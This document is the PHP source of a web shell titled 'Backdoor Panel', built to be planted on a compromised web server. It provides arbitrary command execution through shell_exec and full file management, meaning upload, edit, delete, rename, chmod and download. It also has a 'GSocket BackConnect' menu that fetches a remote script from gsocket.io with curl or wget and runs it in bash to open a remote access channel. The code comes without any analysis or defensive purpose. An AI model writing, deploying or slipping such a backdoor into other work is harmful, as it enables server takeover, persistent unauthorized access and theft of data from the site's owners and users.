<?php
session_start();

if (!isset($_SESSION['login'])) {
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['pass'] ?? '') === $password) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    echo '<form method="POST"><input type="password" name="pass" placeholder="Password"><button type="submit">Login</button></form>';
    exit;
}

$dir = $_GET['path'] ?? getcwd();
chdir($dir);

$terminalOutput = $gsOutput = '';
if (isset($_POST['cmd'])) $terminalOutput = htmlspecialchars(shell_exec($_POST['cmd']));
if (isset($_POST['gs_command']) && $_POST['gs_command'] !== '') $gsOutput = htmlspecialchars(shell_exec($_POST['gs_command']));
if (isset($_FILES['upload'])) move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
if (isset($_POST['newfile'])) file_put_contents($_POST['newfile'], '');
if (isset($_POST['newfolder'])) mkdir($_POST['newfolder']);
if (isset($_GET['del'])) { $t = $_GET['del']; is_file($t) ? unlink($t) : rmdir($t); header("Location: ?path=" . urlencode(dirname($t))); exit; }
if (isset($_GET['download']) && is_file($_GET['download'])) { $f = $_GET['download']; header('Content-Disposition: attachment; filename="' . basename($f) . '"'); header('Content-Length: ' . filesize($f)); readfile($f); exit; }
if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    $f = $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($f));
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Edit File</title><script src='https://cdn.tailwindcss.com'></script></head><body class='bg-gray-900 text-white font-mono p-10'><div class='max-w-5xl mx-auto'><h2 class='text-4xl mb-6'>Editing: <span class='text-green-400'>" . basename($f) . "</span></h2><form method='POST'><textarea name='savefile' rows='25' class='w-full bg-black text-green-400 p-4 rounded border border-green-600 font-mono text-sm leading-relaxed'>$content</textarea><input type='hidden' name='filename' value='$f'><div class='mt-6 flex space-x-4'><button type='submit' class='bg-green-600 px-6 py-3 rounded text-xl border border-green-800'>💾 Save</button><a href='?path=" . urlencode(dirname($f)) . "' class='text-red-400 text-xl hover:underline'>Cancel</a></div></form></div></body></html>";
    exit;
}
if (isset($_POST['savefile'], $_POST['filename'])) file_put_contents($_POST['filename'], $_POST['savefile']);
if (isset($_GET['rename']) && file_exists($_GET['rename'])) { $f = $_GET['rename']; echo "<form method='POST' class='p-10'><h2 class='text-2xl mb-4'>Rename: $f</h2><input type='hidden' name='rename_from' value='$f'><input type='text' name='rename_to' class='bg-gray-700 p-2 rounded text-white w-full' placeholder='New name'><button type='submit' class='mt-4 bg-purple-600 px-4 py-2 rounded border border-purple-800'>Rename</button></form>"; exit; }
if (isset($_POST['rename_from'], $_POST['rename_to'])) { rename($_POST['rename_from'], $_POST['rename_to']); header("Location: ?path=" . urlencode(dirname($_POST['rename_from']))); exit; }
if (isset($_GET['chmod']) && file_exists($_GET['chmod'])) { $f = $_GET['chmod']; echo "<form method='POST' class='p-10'><h2 class='text-2xl mb-4'>Chmod: $f</h2><input type='hidden' name='target' value='$f'><input type='text' name='perm' class='bg-gray-700 p-2 rounded text-white' placeholder='e.g. 0644'><button type='submit' class='ml-4 bg-yellow-600 px-4 py-2 rounded border border-yellow-800'>Set</button></form>"; exit; }
if (isset($_POST['target'], $_POST['perm'])) chmod($_POST['target'], octdec($_POST['perm']));
if (isset($_GET['lock']) && file_exists($_GET['lock'])) { $f = $_GET['lock']; strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? shell_exec("attrib +R \"$f\"") : chmod($f, 0444); header("Location: ?path=" . urlencode(dirname($f))); exit; }
if (isset($_GET['unlock']) && file_exists($_GET['unlock'])) { $f = $_GET['unlock']; strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? shell_exec("attrib -R \"$f\"") : chmod($f, 0644); header("Location: ?path=" . urlencode(dirname($f))); exit; }

// System Info
$uname = php_uname();
$user = get_current_user();
$serverIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$phpVer = phpversion();
$cwd = getcwd();
$disk = disk_total_space(".");
$free = disk_free_space(".");
$used = $disk - $free;
$percent = round(($used / $disk) * 100);
$open_basedir = ini_get('open_basedir') ?: 'NONE';

?><!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Backdoor Panel</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-900 text-white font-mono p-10">
<div class="max-w-7xl mx-auto">
<h1 class="text-5xl mb-6 text-center text-red-400 font-bold">[+] Backdoor Panel [+]</h1>
<div class="mb-4 text-sm">
  <div><span class="text-green-400 font-bold">Uname:</span> <?= $uname ?></div>
  <div><span class="text-pink-400 font-bold">User:</span> <?= $user ?></div>
  <div><span class="text-red-400 font-bold">ServerIP:</span> <?= $serverIP ?> <span class="ml-4">Your IP: <?= $clientIP ?></span></div>
  <div><span class="text-purple-400 font-bold">PHP:</span> <?= $phpVer ?></div>
  <div><span class="text-yellow-400 font-bold">Disk:</span> <?= round($disk / 1e+9, 2) ?> GB, <span class="text-green-300">Free: <?= round($free / 1e+9, 2) ?> GB (<?= 100 - $percent ?>%)</span></div>
  <div><span class="text-blue-400 font-bold">Open_basedir:</span> <?= $open_basedir ?></div>
</div>
<div class="text-right mb-6"><a href="?logout=true" class="text-red-400">Logout</a></div>
<form method="POST" class="mb-10">
<label class="block mb-2 text-xl">Terminal (Realtime-like)</label>
<input type="text" name="cmd" class="w-full p-2 text-black rounded text-sm" placeholder="whoami">
<button type="submit" class="mt-2 bg-green-600 px-4 py-2 rounded">Execute</button>
<?php if ($terminalOutput !== '') echo "<pre class='bg-black text-green-400 mt-2 p-2 rounded text-xs overflow-x-auto max-h-40'>$terminalOutput</pre>"; ?>
</form>
<form method="post" class="mb-10">
<label class="block mb-2">GSocket BackConnect</label>
<select name="gs_command" class="w-full text-black p-2 rounded">
<option value='bash -c "$(curl -fsSL https://gsocket.io/y)"'>curl</option>
<option value='GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"'>curl (no cert check)</option>
<option value='bash -c "$(wget -qO- https://gsocket.io/y)"'>wget</option>
<option value='GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"'>undo</option>
</select>
<button type="submit" class="mt-2 bg-red-600 px-4 py-2 rounded">Run GS</button>
<?php if ($gsOutput !== '') echo "<pre class='bg-black text-red-400 mt-2 p-2 rounded text-xs overflow-x-auto max-h-40'>$gsOutput</pre>"; ?>
</form>
<div class="grid grid-cols-3 gap-4 mb-10">
<form method="POST" enctype="multipart/form-data">
<input type="file" name="upload" class="w-full text-black p-2 rounded">
<button type="submit" class="mt-2 bg-blue-600 w-full py-2 rounded">Upload</button>
</form>
<form method="POST">
<input type="text" name="newfile" class="w-full text-black p-2 rounded" placeholder="newfile.php">
<button type="submit" class="mt-2 bg-purple-600 w-full py-2 rounded">Make File</button>
</form>
<form method="POST">
<input type="text" name="newfolder" class="w-full text-black p-2 rounded" placeholder="new_folder">
<button type="submit" class="mt-2 bg-pink-600 w-full py-2 rounded">Make Dir</button>
</form>
</div>
<div class="text-sm mb-4">
Path: 
<?php
$paths = explode(DIRECTORY_SEPARATOR, realpath($dir));
$build = '';
foreach ($paths as $p) {
    if ($p === '') continue;
    $build .= DIRECTORY_SEPARATOR . $p;
    echo "<a href='?path=" . urlencode($build) . "' class='text-blue-400 hover:underline'>/$p</a> ";
}
?>
</div>
<table class="w-full table-auto border border-gray-700">
<thead><tr class="bg-gray-800"><th class="p-2">Name</th><th class="p-2">Size</th><th class="p-2">Action</th></tr></thead>
<tbody>
<?php
foreach (array_diff(scandir('.'), ['.', '..']) as $f) {
    $full = realpath($f);
    $isDir = is_dir($f);
    $size = $isDir ? 'DIR' : filesize($f) . ' B';
    $nameDisplay = $isDir ? "<a href='?path=" . urlencode($full) . "' class='text-yellow-400 hover:underline'>$f</a>" : $f;
    $actions = [];
    if (!$isDir) {
        $actions[] = "<a href='?edit=" . urlencode($full) . "' class='text-green-400'>[Edit]</a>";
        $actions[] = "<a href='?download=" . urlencode($full) . "' class='text-blue-400'>[Download]</a>";
    }
    $actions[] = "<a href='?rename=" . urlencode($full) . "' class='text-purple-400'>[Rename]</a>";
    $actions[] = "<a href='?del=" . urlencode($full) . "' class='text-red-400'>[Delete]</a>";
    $actions[] = "<a href='?chmod=" . urlencode($full) . "' class='text-yellow-400'>[Chmod]</a>";
    $actions[] = "<a href='?lock=" . urlencode($full) . "' class='text-gray-400'>[Lock]</a>";
    $actions[] = "<a href='?unlock=" . urlencode($full) . "' class='text-white'>[Unlock]</a>";
    echo "<tr class='border-t border-gray-700'><td class='p-2'>$nameDisplay</td><td class='p-2'>$size</td><td class='p-2 space-x-2'>" . implode(' ', $actions) . "</td></tr>";
}
?>
</tbody>
</table>
</div>
</body></html>
